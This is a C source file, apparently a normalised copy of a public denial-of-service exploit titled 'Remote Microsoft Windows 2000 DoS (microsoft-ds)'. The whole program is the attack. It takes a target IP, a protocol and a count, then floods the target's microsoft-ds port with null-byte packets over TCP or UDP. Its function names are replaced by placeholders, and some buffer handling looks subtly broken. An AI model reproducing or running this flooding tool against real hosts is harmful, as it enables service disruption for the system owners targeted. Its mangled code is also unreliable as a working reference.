#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  target ;
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {int /*<<< orphan*/  sin_port; TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  nullbuffer ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  IPPROTO_TCP ; 
 int /*<<< orphan*/  IPPROTO_UDP ; 
 unsigned short MICROSOFT_DS_PORT ; 
 int /*<<< orphan*/  PF_INET ; 
 int /*<<< orphan*/  SOCK_DGRAM ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (char*,int) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 scalar_t__ FUNC3 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC4 (int) ; 
 int /*<<< orphan*/  FUNC5 (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  FUNC6 (unsigned short) ; 
 scalar_t__ FUNC7 (int) ; 
 int /*<<< orphan*/  FUNC8 (struct sockaddr_in*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 
 int /*<<< orphan*/  FUNC10 (char*,...) ; 
 int /*<<< orphan*/  FUNC11 (char*) ; 
 scalar_t__ FUNC12 (int,char*,scalar_t__,int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC13 (int,char*,scalar_t__,int /*<<< orphan*/ ,struct sockaddr*,int) ; 
 int FUNC14 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  stdout ; 
 scalar_t__ FUNC15 (char*) ; 

int FUNC16(int argc, char *argv[])
{
        int sock;
	int count;
	struct sockaddr_in target;
	unsigned short port = MICROSOFT_DS_PORT;
	char *nullbuffer;


	FUNC10("%c[41m", 0x1B);
	FUNC5(stdout, "\n--[ excE's Remote Microsoft Windows 2000 DoS (microsoft-ds)\n"); 
	FUNC10("%c[0m", 0x1B);
	FUNC5(stdout, "-----------------------------------------------------------\n");

        if(argc != 4)
        {
                FUNC5(stderr, "--[ Invalid number of parameters!\n");
                FUNC5(stderr, "--[ Usage: %s <Server IP> <TCP/UDP> <Send Count>\n", argv[0]);
                FUNC5(stderr, "--[ Forex: %s 127.0.0.1 UDP 10000\n\n", argv[0]);
                FUNC4(-1);
        }

	nullbuffer = (char *) FUNC7(10*1024*sizeof(char));
	FUNC1(nullbuffer,sizeof(nullbuffer));
	
	FUNC5(stdout, "--[ Starting attack on %s...\n", argv[1]);

	FUNC8(&target, 0, sizeof(target));
	target.sin_family 	= AF_INET;
	target.sin_addr.s_addr 	= FUNC11(argv[1]);
	target.sin_port		= FUNC6(port);


	if(argv[2][0] == 'U')
	{
		if((sock = FUNC14(PF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
		{
			FUNC9("socket() failed ");
			FUNC4(-1);
		}
	
		FUNC5(stdout, "--[ Sending NULL byte string * %d via UDP\n", FUNC0(argv[3]));

		for(count=0;count<FUNC0(argv[3]);count++)
		{
		    if(FUNC13(sock, nullbuffer, FUNC15(nullbuffer), 0, (struct sockaddr *) &target, sizeof(target)) != FUNC15(nullbuffer))
		    {
				FUNC9("sendto() failed ");
				FUNC4(-1);
		    } else { FUNC10("."); } 
		}
		FUNC2(sock);
		FUNC10("\n");
	}
	 else if(argv[2][0] == 'T')
	{
		
		FUNC5(stdout, "--[ Connecting and sending NULL byte string * %d...\n", FUNC0(argv[3]));
		 
		if((sock = FUNC14(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
		{
			FUNC9("socket() failed ");
			FUNC4(-1);
		}

		if(FUNC3(sock, (struct sockaddr *) &target, sizeof(target)) < 0)
		{
			FUNC9("connect() failed ");
			FUNC4(-1);
		}

		for(count=0;count<FUNC0(argv[3]);count++)
		{ 
			if(FUNC12(sock, nullbuffer, FUNC15(nullbuffer), 0) != FUNC15(nullbuffer))
			{
				FUNC9("send() failed ");
				FUNC4(-1);
			} else { FUNC10("."); }

		}
		FUNC2(sock);
		FUNC10("\n");
	} else
	{
		FUNC5(stderr, "--[ Error: You must define a protocol (TCP or UDP)\n\n");
		FUNC4(-1);
	}

	FUNC5(stdout, "--[ Finished flooding target!\n");
	FUNC5(stdout, "--[ http://www.telhack.tk\n");
	
	return 0;
}